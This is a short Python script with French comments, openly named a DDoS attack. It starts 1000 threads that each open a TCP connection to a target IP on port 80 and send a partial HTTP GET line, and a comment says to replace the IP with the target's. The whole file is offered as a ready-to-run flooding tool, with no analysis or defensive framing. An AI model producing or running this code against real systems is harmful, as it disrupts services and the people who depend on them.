
import socket
import threading

# Fonction pour envoyer une requête
def send_request(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))
    client.send(b"GET / HTTP/1.1\r\n")
    client.close()

# Lancer plusieurs threads (simuler un DDoS sur plusieurs machines)
def ddos_attack(target_ip, target_port, num_threads):
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_request, args=(target_ip, target_port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Exécution de l'attaque
target_ip = "192.168.1.1"  # Remplace par l'IP cible
target_port = 80  # Le port HTTP
num_threads = 1000  # Le nombre de threads à utiliser pour simuler l'attaque DDoS

ddos_attack(target_ip, target_port, num_threads)
